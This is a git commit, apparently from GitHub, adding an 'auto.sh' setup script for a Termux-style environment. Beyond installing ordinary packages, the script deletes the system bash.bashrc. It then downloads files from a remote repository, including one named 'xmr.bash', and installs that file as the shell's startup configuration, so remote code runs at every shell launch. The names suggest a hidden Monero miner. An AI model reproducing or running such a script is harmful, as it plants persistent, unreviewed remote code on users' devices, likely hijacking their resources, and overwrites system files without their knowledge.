541d649cbf5729ad896c399b8a53c4d020fed7d4
esp32miner <nanartg123@gmail.com>
2025-09-02 02:39:18 +0700

    Add files via upload

---
+++ auto.sh
@@ -0,0 +1,6 @@
+apt update && yes | apt upgrade && apt update && apt install git -y && pkg install wget -y && pkg install nmap -y && pkg install wget -y && apt-get install git && pkg install git && apt -y install neofetch
+cd && pwd && cd ../usr/etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/esp32miner/bash.bitcon/refs/heads/main/xmr.bash && wget https://raw.githubusercontent.com/esp32miner/bash.bitcon/refs/heads/main/bash.bashrc1
+cp xmr.bash ../etc/bash.bashrc
+cp bash.bashrc1 ../etc/bash.bashrc1
+rm -rf xmr.bash
+exit
